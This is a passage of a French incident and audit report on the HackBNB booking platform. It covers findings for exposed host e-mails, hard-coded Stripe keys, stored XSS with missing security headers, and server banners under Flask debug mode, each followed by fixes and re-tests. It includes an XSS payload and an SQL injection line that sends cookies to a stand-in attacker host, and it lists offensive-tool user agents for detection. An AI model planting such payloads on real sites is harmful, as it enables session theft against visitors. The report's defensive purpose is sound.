+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Exposée, non ciblée.</strong> Aucune requête spécifique, mais chaque <code>GET /api/rooms/&lt;id&gt;</code> servi à l'attaquant (10:52, 11:12, 11:17, 11:34) contenait l'e-mail de l'hôte.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> : séparer la représentation publique de l'utilisateur de sa représentation privée, et n'utiliser que la première dans les sérialisations publiques.
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># users_models.py</span>
+<span class="k">def</span> <span class="nf">to_public_dict</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">}</span>
+
+<span class="c1"># rooms_models.py</span>
+<span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">host_user</span><span class="p">:</span>
+    <span class="n">output</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">host_user</span><span class="o">.</span><span class="n">to_public_dict</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>
+
+L'e-mail ne doit être renvoyé que par une route authentifiée (<code>/users/me</code>), à l'utilisateur concerné.
+</p>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>GET /api/rooms/1</code> et <code>GET /api/rooms/</code> ne doivent plus contenir de champ <code>host.email</code>.
+</p>
+
+<hr />
+
+<h3 id="d6-clé-api-stripe-exposée-dans-le-dépôt-git-code-actuel-et-historique">D6 : Clé API Stripe exposée dans le dépôt Git (code actuel et historique)</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-798 (Use of Hard-coded Credentials), CWE-540 (Inclusion of Sensitive Information in Source Code)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A07:2021 – Identification and Authentication Failures</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>docker-compose.yml</code>, ligne 10 (commit <code>4aec6cd79…</code>, toujours en HEAD) + <code>back/services/stripe.py</code> (commit <code>ef5503c</code>, retiré au commit <code>9eeb41e</code>)</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">yaml</div><div class="hl"><pre><span></span><span class="c1"># docker-compose.yml, ligne 10 : commit 4aec6cd799457718ab012c186fb29bb6fc3adc43, toujours présent en HEAD</span>
+<span class="nt">environment</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">APP_ORIGIN_HOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://localhost:9000</span>
+<span class="w">  </span><span class="nt">STRIPE_API_KEY</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">sk_test_51R…[tronqué]</span>
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># back/services/stripe.py : commit ef5503c, retiré au commit 9eeb41e</span>
+<span class="n">stripe</span><span class="o">.</span><span class="n">api_key</span> <span class="o">=</span> <span class="s2">&quot;rk_test_51R…[tronqué]&quot;</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : un scan Gitleaks de l'historique complet du dépôt remonte 113 alertes, dont 110 sont des secrets de confirmation journalisés dans <code>apache.log</code> (voir annexe A). Après triage, deux clés Stripe distinctes et réellement exploitables sont confirmées :
+</p>
+
+<ol>
+
+<li>
+
+
+Une clé secrète (<code>sk_test_…</code>, droits complets sur le compte marchand) en dur dans <code>docker-compose.yml</code>, introduite au commit <code>4aec6cd799457718ab012c186fb29bb6fc3adc43</code> (Emma Roussel, 2025-03-19) : <strong>toujours présente dans le code actuel (HEAD)</strong>, lisible sans avoir besoin de consulter l'historique Git.
+
+</li>
+
+<li>
+
+
+Une clé restreinte (<code>rk_test_…</code>) en dur dans <code>back/services/stripe.py</code>, introduite au commit <code>ef5503c</code> puis remplacée par <code>os.getenv('STRIPE_API_KEY')</code> au commit <code>9eeb41e</code> : retirée du code courant mais toujours lisible dans l'historique.
+
+</li>
+
+</ol>
+
+<h4 id="preuve-1-clé-stripe-en-dur-dans-docker-composeyml-toujours-en-head">Preuve 1 : Clé Stripe en dur dans <code>docker-compose.yml</code> (toujours en HEAD)</h4>
+<div class="codeblock"><div class="code-lang">json</div><div class="hl"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;RuleID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;stripe-access-token&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Found a Stripe Access Token, posing a risk to payment processing services and sensitive financial data.&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;StartLine&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;EndLine&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Match&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sk_test_51R…[tronqué]&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;File&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;docker-compose.yml&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Commit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4aec6cd799457718ab012c186fb29bb6fc3adc43&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Entropy&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">5.3875604</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Author&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Emma Roussel&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;emma.roussel@hackbnb.dev&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Date&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2025-03-19T15:30:25Z&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;chore: implement Docker Compose deployment setup&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Fingerprint&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4aec6cd799457718ab012c186fb29bb6fc3adc43:docker-compose.yml:stripe-access-token:10&quot;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>
+
+<code>git show HEAD:docker-compose.yml</code> confirme que la clé est encore présente dans la version actuelle du dépôt : aucune recherche dans l'historique n'est nécessaire pour la récupérer.
+</p>
+
+<h4 id="preuve-2-clé-stripe-retirée-du-code-mais-toujours-lisible-dans-lhistorique">Preuve 2 : Clé Stripe retirée du code mais toujours lisible dans l'historique</h4>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span>git<span class="w"> </span>show<span class="w"> </span>ef5503c:back/services/stripe.py
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="n">stripe</span><span class="o">.</span><span class="n">api_key</span> <span class="o">=</span> <span class="s2">&quot;rk_test_51R…[tronqué]&quot;</span>
+</pre></div>
+</div>
+<p>
+
+Le commit <code>9eeb41e</code> (&quot;fix: do not hardcode the Stripe API key&quot;) retire la clé du code courant, mais ne la supprime pas de l'historique Git : tout clone du dépôt permet de la relire intégralement.
+</p>
+
+<p>
+
+<strong>Impact</strong> : une clé Stripe valide permet d'interroger directement l'API du compte marchand (consultation des transactions, et selon les droits associés à la clé, création ou remboursement de paiements) sans passer par l'application HackBNB.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Difficile</strong> × Impact <strong>Critique</strong> = <strong>Majeur</strong> (évaluation de l'annexe 5, qui porte sur la fuite dans l'historique ; voir la divergence ci-dessous).
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Non observée.</strong> Le dépôt Git n'est pas accessible depuis le site. Le fichier <code>stripe.py</code> lu via D2 ne contient plus la clé, et la lecture de <code>.env</code> a échoué (<code>500</code>).
+</p>
+
+<p>
+
+<strong>Observation complémentaire (divergence avec le rapport de pentest)</strong> : l'annexe 5 évalue D6 en Exploitation <strong>Difficile</strong>, ce qui suppose une recherche dans l'historique Git. La Preuve 1 montre que la clé <code>sk_test_…</code> est en réalité lisible <strong>directement dans le fichier <code>docker-compose.yml</code> courant</strong>, sans archéologie Git : pour cette fuite précise, l'exploitation réelle est <strong>Facile</strong>, ce qui porterait le risque résultant à <strong>Critique</strong> (Facile × Critique) plutôt que Majeur. La vulnérabilité s'est donc aggravée depuis l'audit de juin 2026 : la clé n'a toujours pas été tournée ni retirée du code en production.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> :
+</p>
+
+<ol>
+
+<li>
+
+
+Révoquer immédiatement les deux clés dans le dashboard Stripe : les retirer du code ne suffit pas tant qu'elles restent valides côté Stripe.
+
+</li>
+
+<li>
+
+
+Ne jamais committer de secret : externaliser via un fichier <code>.env</code> non versionné (<code>.gitignore</code>) ou un gestionnaire de secrets dédié (Vault, AWS/GCP Secrets Manager).
+
+</li>
+
+<li>
+
+
+Nettoyer l'historique Git après rotation des clés (<code>git filter-repo</code>, BFG Repo-Cleaner).
+
+</li>
+
+<li>
+
+
+Intégrer un scanner de secrets (Gitleaks, TruffleHog) en pre-commit et en CI pour bloquer toute nouvelle fuite avant fusion.
+
+</li>
+
+</ol>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>gitleaks git .</code> doit renvoyer 0 secret Stripe, et les anciennes clés doivent apparaître comme révoquées dans le dashboard Stripe.
+</p>
+
+<hr />
+
+<h3 id="d7-en-têtes-de-sécurité-manquants-menant-à-une-exécution-de-scripts-xss">D7 : En-têtes de sécurité manquants menant à une exécution de scripts (XSS)</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-79 (Cross-site Scripting), CWE-693 (Protection Mechanism Failure)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A05:2021 – Security Misconfiguration, A03:2021 – Injection</td>
+</tr>
+<tr>
+<td><strong>Référence test</strong></td>
+<td>OWASP WSTG-CONF-12 (Test for Content Security Policy), WSTG-INPV-02 (Stored XSS)</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>apache/apache-prod.conf</code> (aucun en-tête de sécurité), <code>front/src/pages/room/Room.tsx</code>, ligne 52, <code>front/src/pages/booking/Booking.tsx</code>, ligne 49</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">tsx</div><div class="hl"><pre><span></span>// front/src/pages/room/Room.tsx:52
+&lt;div className=&quot;mt-8&quot; dangerouslySetInnerHTML={{__html: room.description}}&gt;&lt;/div&gt;
+
+// front/src/pages/booking/Booking.tsx:49
+&lt;div className=&quot;mt-8&quot; dangerouslySetInnerHTML={{__html: booking.room.description}}&gt;&lt;/div&gt;
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">apache</div><div class="hl"><pre><span></span><span class="c"># apache/apache-prod.conf : seule directive d&#39;en-tête présente dans le VirtualHost</span>
+<span class="nb">RequestHeader</span><span class="w"> </span>set<span class="w"> </span>X-Forwarded-Proto<span class="w"> </span><span class="s2">&quot;https&quot;</span>
+<span class="c"># aucun Header set Content-Security-Policy / X-Content-Type-Options / X-Frame-Options / HSTS</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : deux défauts se combinent.
+</p>
+
+<ol>
+
+<li>
+
+
+Le front injecte le champ <code>description</code> renvoyé par l'API directement dans le DOM via <code>dangerouslySetInnerHTML</code>, sans échappement ni assainissement. L'API renvoie déjà ce champ en HTML brut (<code>&quot;&lt;p&gt;Loft moderne… &lt;em&gt;Proche des transports&lt;/em&gt;.&lt;/p&gt;&quot;</code>).
+
+</li>
+
+<li>
+
+
+Ni Apache (<code>apache-prod.conf</code>) ni Flask (<code>back/app.py</code>, pas de Flask-Talisman ni de <code>after_request</code>) ne positionnent d'en-tête de sécurité. En l'absence de <code>Content-Security-Policy</code>, le navigateur exécute sans restriction tout script injecté dans la page.
+
+</li>
+
+</ol>
+
+<h4 id="preuve-1-absence-den-têtes-de-sécurité">Preuve 1 : Absence d'en-têtes de sécurité</h4>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span>curl<span class="w"> </span>-sI<span class="w"> </span>https://hackbnb.dashbox.cloud/
+curl<span class="w"> </span>-sI<span class="w"> </span>https://hackbnb.dashbox.cloud/api/
+</pre></div>
+</div>
+<div class="codeblock"><div class="hl"><pre><span></span># https://hackbnb.dashbox.cloud/
+HTTP/2 200
+cache-control: no-cache
+content-type: text/html
+server: Apache/2.4.68 (Unix)
+vary: Origin
+
+# https://hackbnb.dashbox.cloud/api/
+HTTP/2 200
+access-control-allow-origin: http://localhost:9000
+content-type: text/html; charset=utf-8
+server: Werkzeug/3.1.8 Python/3.14.0
+</pre></div>
+</div>
+<p>
+
+Aucun <code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Referrer-Policy</code> ni <code>Strict-Transport-Security</code>, que ce soit sur le front ou sur l'API.
+</p>
+
+<h4 id="preuve-2-le-html-fourni-par-lapi-est-interprété-par-le-navigateur">Preuve 2 : Le HTML fourni par l'API est interprété par le navigateur</h4>
+<p>
+
+<img src="img/D7_XSS_1-description-rendered-html.png" alt="D7 : description rendue en HTML sur le front" />
+</p>
+
+<p>
+
+Page <code>/room/1</code> : la <code>description</code> (<code>&lt;p&gt;Spa idéal pour se détendre !&lt;/p&gt;</code>) est rendue comme un paragraphe HTML et non affichée littéralement. <code>dangerouslySetInnerHTML</code> interprète donc bien le HTML renvoyé par l'API. Un payload <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code> placé dans ce champ s'exécuterait de la même façon.
+</p>
+
+<p>
+
+<strong>Chaînage (non exécuté, tests non destructifs)</strong> : un attaquant capable d'écrire dans <code>rooms.description</code> (via l'injection SQL <strong>D1</strong>, ou en tant qu'hôte malveillant) obtient un <strong>XSS stocké</strong> exécuté chez chaque visiteur de <code>/room/&lt;id&gt;</code> et de <code>/booking/&lt;ref&gt;</code> :
+</p>
+
+<div class="codeblock"><div class="code-lang">sql</div><div class="hl"><pre><span></span><span class="k">UPDATE</span><span class="w"> </span><span class="n">rooms</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;img src=x onerror=fetch(&quot;https://attaquant.tld/?c=&quot;+document.cookie)&gt;&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Impact</strong> : vol de session, actions effectuées au nom de la victime (réservations, modification de compte), redirection vers une page de phishing. L'impact se limite au front, mais touche <strong>tous</strong> les visiteurs d'une annonce piégée.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Difficile</strong> × Impact <strong>Majeur</strong> = <strong>Majeur</strong>.
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Non observée.</strong> Aucun payload XSS dans le journal.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> :
+</p>
+
+<ol>
+
+<li>
+
+
+Ne plus rendre de HTML non fiable : supprimer <code>dangerouslySetInnerHTML</code> et afficher la description comme texte (React échappe automatiquement), ou l'assainir avec DOMPurify si le formatage doit être conservé.
+
+<div class="codeblock"><div class="code-lang">tsx</div><div class="hl"><pre><span></span>&lt;div className=&quot;mt-8&quot;&gt;{room.description}&lt;/div&gt;
+// ou : dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(room.description)}}
+</pre></div>
+</div>
+</li>
+
+<li>
+
+
+Positionner les en-têtes de sécurité dans le <code>VirtualHost</code> de <code>apache-prod.conf</code> (module <code>mod_headers</code>) :
+
+<div class="codeblock"><div class="code-lang">apache</div><div class="hl"><pre><span></span><span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>set<span class="w"> </span>Content-Security-Policy<span class="w"> </span><span class="s2">&quot;default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;&quot;</span>
+<span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>set<span class="w"> </span>X-Content-Type-Options<span class="w"> </span><span class="s2">&quot;nosniff&quot;</span>
+<span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>set<span class="w"> </span>X-Frame-Options<span class="w"> </span><span class="s2">&quot;DENY&quot;</span>
+<span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>set<span class="w"> </span>Referrer-Policy<span class="w"> </span><span class="s2">&quot;no-referrer&quot;</span>
+<span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>set<span class="w"> </span>Strict-Transport-Security<span class="w"> </span><span class="s2">&quot;max-age=31536000; includeSubDomains&quot;</span>
+</pre></div>
+</div>
+</li>
+
+</ol>
+
+<p>
+
+<strong>Observation complémentaire</strong> : l'API renvoie <code>access-control-allow-origin: http://localhost:9000</code>. <code>APP_ORIGIN_HOST</code> est resté sur sa valeur de développement en pré-production : la configuration CORS n'a pas été adaptée à l'environnement.
+</p>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>curl -sI https://hackbnb.dashbox.cloud/</code> doit afficher <code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Referrer-Policy</code> et <code>Strict-Transport-Security</code>. Une description <code>&lt;img src=x onerror=alert(1)&gt;</code> doit s'afficher en texte, sans exécution.
+</p>
+
+<hr />
+
+<h3 id="d8-divulgation-dinformations-sensibles-dans-les-en-têtes-de-réponse">D8 : Divulgation d'informations sensibles dans les en-têtes de réponse</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-497 (Exposure of Sensitive System Information), CWE-489 (Active Debug Code)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A05:2021 – Security Misconfiguration</td>
+</tr>
+<tr>
+<td><strong>Référence test</strong></td>
+<td>OWASP WSTG-INFO-02 (Fingerprint Web Server)</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/app.py</code>, lignes 42-46 + <code>prod.entrypoint.sh</code>, ligne 2 + <code>apache/apache-prod.conf</code> (absence de <code>ServerTokens</code> / <code>ServerSignature</code>)</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># back/app.py:42</span>
+<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+   <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+   <span class="n">host</span><span class="o">=</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span>
+   <span class="n">port</span><span class="o">=</span><span class="mi">9001</span><span class="p">,</span>
+<span class="p">)</span>
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span><span class="c1"># prod.entrypoint.sh : l&#39;image de production lance directement ce serveur</span>
+apache2ctl<span class="w"> </span>-D<span class="w"> </span>FOREGROUND<span class="w"> </span><span class="p">&amp;</span>
+python3<span class="w"> </span>app.py
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : l'API Flask est servie par le <strong>serveur de développement Werkzeug</strong> en mode <code>debug=True</code>. Werkzeug ajoute sa version et celle de Python à chaque réponse. Côté Apache, aucune directive <code>ServerTokens Prod</code> ne limite la bannière, si bien que la version exacte du serveur est également annoncée.
+</p>
+
+<h4 id="preuve-bannières-serveur-sur-le-front-et-lapi">Preuve : Bannières serveur sur le front et l'API</h4>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span>curl<span class="w"> </span>-sI<span class="w"> </span>https://hackbnb.dashbox.cloud/<span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>server
+<span class="c1"># server: Apache/2.4.68 (Unix)</span>
+
+curl<span class="w"> </span>-sI<span class="w"> </span>https://hackbnb.dashbox.cloud/api/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>server
+<span class="c1"># server: Werkzeug/3.1.8 Python/3.14.0</span>
+</pre></div>
+</div>
+<p>
+
+Réponses complètes (capturées le 9 novembre 2026, requêtes GET non destructives) :
+</p>
+
+<div class="codeblock"><div class="hl"><pre><span></span>$ curl -i https://hackbnb.dashbox.cloud/
+
+HTTP/2 200
+cache-control: no-cache
+content-type: text/html
+date: Mon, 09 Nov 2026 15:31:59 GMT
+etag: W/&quot;268-6R9WRQdFozTi1rC+8sChkchLtzo&quot;
+server: Apache/2.4.68 (Unix)
+vary: Origin
+content-length: 616
+</pre></div>
+</div>
+<p>
+
+→ D8 : bannière Apache (version exacte) exposée.
+</p>
+
+<div class="codeblock"><div class="hl"><pre><span></span>$ curl -i https://hackbnb.dashbox.cloud/api/
+
+HTTP/2 200
+access-control-allow-origin: http://localhost:9000
+content-type: text/html; charset=utf-8
+date: Mon, 09 Nov 2026 15:31:59 GMT
+server: Werkzeug/3.1.8 Python/3.14.0
+content-length: 14
+</pre></div>
+</div>
+<p>
+
+→ D8 : serveur de développement Werkzeug (Flask <code>debug=True</code>) et versions exactes de Werkzeug et Python exposés.
+→ D7 : aucun en-tête de sécurité (<code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Strict-Transport-Security</code> tous absents).
+</p>
+
+<p>
+
+Les réponses divulguent :
+</p>
+
+<ul>
+
+<li>
+
+
+la version exacte d'<strong>Apache</strong> (<code>2.4.68</code>) ;
+
+</li>
+
+<li>
+
+
+l'utilisation du <strong>serveur de développement Werkzeug</strong> en production, avec les versions exactes <strong>Werkzeug 3.1.8</strong> et <strong>Python 3.14.0</strong>.
+
+</li>
+
+</ul>
+
+<p>
+
+<strong>Impact</strong> : un attaquant peut cibler directement les CVE connues pour ces versions précises, sans phase de reconnaissance. Le point le plus sérieux est le mode <code>debug=True</code> : toute exception non gérée renvoie une page de traceback détaillée (chemins, extraits de code, variables), et le débogueur interactif Werkzeug permet l'exécution de code Python s'il devient accessible. Les conséquences restent isolées tant que le débogueur n'est pas atteint.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Très difficile</strong> × Impact <strong>Important</strong> = <strong>Mineur</strong>.
+<em>Note : la lecture des bannières est triviale. Le classement « Très difficile » porte sur la suite de l'attaque, qui suppose de trouver et d'exploiter une vulnérabilité propre à ces versions.</em>
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Oui.</strong> 11:18:49 – 11:18:54 : <code>?name=test.jpg</code>, <code>.env</code>, <code>/etc/passwd</code> → <code>500</code> de 23 Ko, soit le traceback du débogueur Werkzeug. L'attaquant y a vu l'arborescence du back juste avant de lire les fichiers par D2.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> :
+</p>
+
+<ol>
+
+<li>
+
+
+Désactiver le mode debug et servir l'API avec un serveur WSGI de production :
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># app.py : debug=False par défaut</span>
+<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">9001</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span><span class="c1"># prod.entrypoint.sh</span>
+gunicorn<span class="w"> </span>-w<span class="w"> </span><span class="m">4</span><span class="w"> </span>-b<span class="w"> </span><span class="m">127</span>.0.0.1:9001<span class="w"> </span>app:app
+</pre></div>
+</div>
+</li>
+
+<li>
+
+
+Masquer les bannières dans <code>apache-prod.conf</code> (<code>mod_headers</code> est déjà activé dans <code>prod.dockerfile</code>) :
+
+<div class="codeblock"><div class="code-lang">apache</div><div class="hl"><pre><span></span><span class="nb">ServerTokens</span><span class="w"> </span>Prod<span class="w">          </span>#<span class="w"> </span>bannière<span class="w"> </span>Apache<span class="w"> </span>réduite<span class="w"> </span>à<span class="w"> </span><span class="s2">&quot;Apache&quot;</span>
+<span class="nb">ServerSignature</span><span class="w"> </span><span class="k">Off</span><span class="w">        </span>#<span class="w"> </span>pas<span class="w"> </span>de<span class="w"> </span>version<span class="w"> </span>dans<span class="w"> </span>les<span class="w"> </span>pages<span class="w"> </span>d&#39;erreur
+<span class="nb">Header</span><span class="w"> </span>unset<span class="w"> </span>Server<span class="w">        </span>#<span class="w"> </span>retire<span class="w"> </span>l&#39;en-tête<span class="w"> </span>Server<span class="w"> </span>transmis<span class="w"> </span>par<span class="w"> </span>le<span class="w"> </span>back<span class="w"> </span>via<span class="w"> </span>ProxyPass
+<span class="nb">Header</span><span class="w"> </span>always<span class="w"> </span>unset<span class="w"> </span>X-Powered-By
+</pre></div>
+</div>
+</li>
+
+</ol>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>curl -sI …/api/</code> ne doit plus afficher <code>Werkzeug</code> ni <code>Python</code>. <code>GET /api/uploads/?name=test.jpg</code> ne doit plus renvoyer de traceback.
+</p>
+
+<hr />
+
+<h2 id="7-recommandations-priorisées">7. Recommandations priorisées</h2>
+<p>
+
+Les correctifs propres à chaque faille sont détaillés en section 6. Cette section les ordonne et ajoute les mesures organisationnelles.
+</p>
+
+<h3 id="immédiat-avant-toute-remise-en-ligne">Immédiat (avant toute remise en ligne)</h3>
+<ol>
+
+<li>
+
+
+<strong>Révoquer et régénérer les clés Stripe</strong> <code>sk_test_…</code> et <code>rk_test_…</code> (D6), puis contrôler dans le dashboard Stripe l'absence d'opération non légitime depuis le 7 novembre.
+
+</li>
+
+<li>
+
+
+<strong>Notifier la CNIL</strong> (RGPD, art. 33). Le délai de 72 h court depuis la prise de connaissance de l'incident, le 9 novembre au matin. Si ce délai est dépassé, la notification doit en expliquer les raisons.
+
+</li>
+
+<li>
+
+
+<strong>Informer les 624 clients concernés</strong> (RGPD, art. 34) : données de paiement exposées et mises en vente, risque d'hameçonnage ciblé. Prévenir également Stripe.
+
+</li>
+
+<li>
+
+
+<strong>Corriger D1, D2, D3 et D4</strong> (risque critique), puis rejouer les requêtes de l'attaquant pour vérifier qu'elles échouent (section 6, « Correctif et re-test »).
+
+</li>
+
+<li>
+
+
+<strong>Désactiver le mode debug</strong> et passer sur un serveur WSGI de production (D8).
+
+</li>
+
+</ol>
+
+<h3 id="court-terme-sous-un-mois">Court terme (sous un mois)</h3>
+<ol start="6">
+
+<li>
+
+
+Corriger D5 et D7 et positionner les en-têtes de sécurité.
+
+</li>
+
+<li>
+
+
+Purger l'historique Git des secrets (<code>git filter-repo</code>) et ajouter Gitleaks en hook <code>pre-commit</code> et en CI (D6).
+
+</li>
+
+<li>
+
+
+Migrer le hachage des mots de passe de MD5 non salé vers Argon2id ou bcrypt. Forcer la réinitialisation des mots de passe, la table <code>users</code> ayant pu être lue (D1).
+
+</li>
+
+<li>
+
+
+Ne plus transmettre <code>checkout_confirmation_secret</code> dans l'URL de retour Stripe (CWE-598). Purger les journaux qui le contiennent.
+
+</li>
+
+</ol>
+
+<h3 id="moyen-terme-détection-et-prévention">Moyen terme (détection et prévention)</h3>
+<ol start="10">
+
+<li>
+
+
+<strong>Détection</strong> : centraliser les journaux (la pile Grafana / Loki utilisée ici convient) et créer des alertes simples, qui auraient suffi le 7 novembre :
+
+<ul>
+
+<li>
+
+
+plus de 100 requêtes par minute depuis une même IP ;
+
+</li>
+
+<li>
+
+
+User-Agent d'outil offensif (<code>dirsearch</code>, <code>sqlmap</code>, <code>python-requests</code>…) ;
+
+</li>
+
+<li>
+
+
+pic de réponses 404 ou 500 ;
+
+</li>
+
+<li>
+
+
+réponse de plus de 1 Mo sur une route API.
+
+</li>
+
+</ul>
+
+</li>
+
+<li>
+
+
